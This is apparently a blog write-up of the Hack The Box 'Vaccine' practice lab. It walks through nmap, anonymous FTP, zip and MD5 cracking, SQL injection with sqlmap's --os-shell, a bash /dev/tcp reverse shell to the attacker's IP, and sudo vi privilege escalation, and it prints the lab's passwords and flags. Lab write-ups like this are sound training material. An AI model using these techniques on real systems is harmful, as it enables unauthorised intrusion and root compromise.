---
title: 'Vaccine - HTB Starting Point Tier 2'
description: 'Writeup for Vaccine box'
pubDate: 'Feb 6 2025'
heroImage: '/blog-placeholder-1.jpg'
---

## Vaccine
*Postgres, PHP, SQLi*

**Task 1**  
Besides SSH and HTTP, what other service is hosted on this box?  

FTP as per nmap scan

```bash
kali$ nmap -sC $TARGET --min-rate=2000 | tee nmap-sc.txt
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-05 11:13 AEDT
Nmap scan report for 10.129.95.174
Host is up (0.36s latency).
Not shown: 997 closed tcp ports (reset)
PORT   STATE SERVICE
21/tcp open  ftp
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:10.10.15.41
|      Logged in as ftpuser
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rwxr-xr-x    1 0        0            2533 Apr 13  2021 backup.zip
22/tcp open  ssh
| ssh-hostkey:
|   3072 c0:ee:58:07:75:34:b0:0b:91:65:b2:59:56:95:27:a4 (RSA)
|   256 ac:6e:81:18:89:22:d7:a7:41:7d:81:4f:1b:b8:b2:51 (ECDSA)
|_  256 42:5b:c3:21:df:ef:a2:0b:c9:5e:03:42:1d:69:d0:28 (ED25519)
80/tcp open  http
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
|_http-title: MegaCorp Login

Nmap done: 1 IP address (1 host up) scanned in 17.06 seconds
```

**Task 2**  
This service can be configured to allow login with any password for specific username. What is that username?  

`anonymous`

**Task 3**  
What is the name of the file downloaded over this service?  

`backup.zip`

```bash
kali$ ftp $TARGET
Connected to 10.129.95.174.
220 (vsFTPd 3.0.3)
Name (10.129.95.174:malachi): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||10511|)
150 Here comes the directory listing.
-rwxr-xr-x    1 0        0            2533 Apr 13  2021 backup.zip
226 Directory send OK.
ftp> get backup.zip
local: backup.zip remote: backup.zip
229 Entering Extended Passive Mode (|||10450|)
150 Opening BINARY mode data connection for backup.zip (2533 bytes).
100% |*************************************************************************************************************************************|  2533      489.24 KiB/s    00:00 ETA
226 Transfer complete.
2533 bytes received in 00:00 (6.83 KiB/s)
ftp> pwd
Remote directory: /
```


**Task 4**  
What script comes with the John The Ripper toolset and generates a hash from a password protected zip archive in a format to allow for cracking attempts?  

`zip2john`

**Task 5**  
What is the password for the admin user on the website?  

1. Use John to crack zip (password: `741852963`)
2. Read index file and we find md5 hash of admin password (md5: `2cb42f8734ea607eefed3b70af13bbd3`)
3. Lookup unsalted md5 reverse to get `qwerty789` for user `admin`

**Task 6**  
What option can be passed to sqlmap to try to get command execution via the sql injection?  

Given we have an admin password to the PHP site, let's take a look at the website and peek around for any potential vulnerabilities. Upon logging in, we are granted with a dashboard with a search bar. That search appears to be the only interactive functionality. Let's have a play around. Aha! Typing `a'` gives us a SQL error

```sql
ERROR: unterminated quoted string at or near "'" LINE 1: Select * from cars where name ilike '%a'%'^
```

At this point, we have an unsanitised input for SQLi at the endpoint `http://$TARGET/dashboard.php?search=<something>`

Looking at the `sqlmap` options, the `--os-shell` looks pretty good.


**Task 7**  
What program can the postgres user run as root using sudo?  

First, let's gain access to the machine. (n.b. extending the timeout prevented me from getting kicked off every couple of minutes)

```bash
kali$ sqlmap --os-shell -u http://$TARGET/dashboard.php?search=abc --cookie=PHPSESSID=<session id> --timeout 1800
...
it looks like the back-end DMBS is 'PostgreSQL'
...
[09:26:14] [INFO] the back-end DBMS is PostgreSQL
web server operating system: Linux Ubuntu 20.10 or 19.10 or 20.04 (eoan or focal)
web application technology: Apache 2.4.41
back-end DBMS: PostgreSQL
[09:26:17] [INFO] fingerprinting the back-end DBMS operating system
[09:26:19] [INFO] the back-end DBMS operating system is Linux
[09:26:20] [INFO] testing if current user is DBA
[09:26:21] [INFO] going to use 'COPY ... FROM PROGRAM ...' command execution
[09:26:21] [INFO] calling Linux OS shell. To quit type 'x' or 'q' and press ENTER
os-shell> whoami
command standard output: 'postgres'
os-shell> pwd
command standard output: '/var/lib/postgresql/11/main'
```

Let's establish a more stable shell

```
os-shell> /bin/bash -c 'bash -i >& /dev/tcp/<IP>/1337 0>&1'
...
kali$ nc -lvnp 1337
postgres@vaccine:/var/lib/postgresql/11/main$
```

My initial idea was to look for files that had the SETUID bit. That could perhaps give an idea for a program we could abuse for privesc. Unfortunately that only yielded the standard files in /usr/bin and /usr/share, as well as a bunch of snap packages. This didn't seem to be the right approach:

```bash
# Failed attempt to find permissions
find /usr 2>/dev/null -type f -perm /4000
```

I referred to a hint which pointed me in the direction of `sudo -l`. When trying to find permissions by `sudo -l`, I was getting hit with the error `sudo: a terminal is required to read the password`. At this point, I returned to the writeup which showed that while this bash reverse shell was more stable, it wasn't enough - we needed a stable shell. See docs for [`pty.spawn()`](https://docs.python.org/3/library/pty.html#pty.spawn)

```
postgres@vaccine:/$ python3 -c 'import pty;pty.spawn("/bin/bash")'
```

Even still, trying to use the command `sudo -l` was prompting for a password. I did go to the writeup for a hint - it said to look in the `/var/www/html` directory where the site was. If there were some creds stored in the PHP files, there could possible be some SQL things too. We know the dashboard is retrieving data from somewhere. Let's look at that:

```php
$conn = pg_connect("host=localhost port=5432 dbname=carsdb user=postgres password=P@s5w0rd!");
```

Excellent! Looks like exactly what we're after.

```bash
postgres@vaccine:/var/www/html$ sudo -l
sudo -l
[sudo] password for postgres: P@s5w0rd!

Matching Defaults entries for postgres on vaccine:
    env_keep+="LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET", env_keep+="XAPPLRESDIR
    XFILESEARCHPATH XUSERFILESEARCHPATH",
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    mail_badpass

User postgres may run the following commands on vaccine:
    (ALL) /bin/vi /etc/postgresql/11/main/pg_hba.conf
```

The user can run `vi` as root. (n.b. it can run as root to edit that specific file. I didn't realise that at first)


**Task 8**  
Submit user flag  

From spawning a stable shell in task 7:
```bash
postgres@vaccine:/var/lib/postgresql/11/main$ cd ~
cd ~
postgres@vaccine:/var/lib/postgresql$ ls
ls
11  user.txt
postgres@vaccine:/var/lib/postgresql$ cat user.txt
cat user.txt
ec9b13ca4d6229cd5cc1e09980965bf7
```


**Task 9**  
Submit root flag  

In vi, we can get a shell by `:sh`. Doing so after opening the file with sudo gives us a root shell. 

```bash
postgres@vaccine$ sudo vi /etc/postgresql/11/main/pg_hba.conf
password for postgres: ...

# vim
:sh
wroot@vaccine#whoami
whoami
root
root@vaccine# cd ~
root@vaccine:~# ls
ls
pg_hba.conf  root.txt  snap
root@vaccine:~# cat root.txt
cat root.txt
dd6e058e814260bc70e9bbdef2715849
```

Look at that! Root flag obtained. What I didn't know earlier, and perhaps was due to not reading the full output before, was that in order for the command to be executed as root, I would need to use `sudo` on that specific command. I had assumed that simply using `vi` would automatically default to root. When that didn't work, I assumed that using `vi` to open the file would automatically escalate me to root. Turns out, I need to specify sudo. Sudo would then perform a lookup to validate permissions. Also worth noting is the gtfobins page on vi here: https://gtfobins.github.io/gtfobins/vi/#sudo

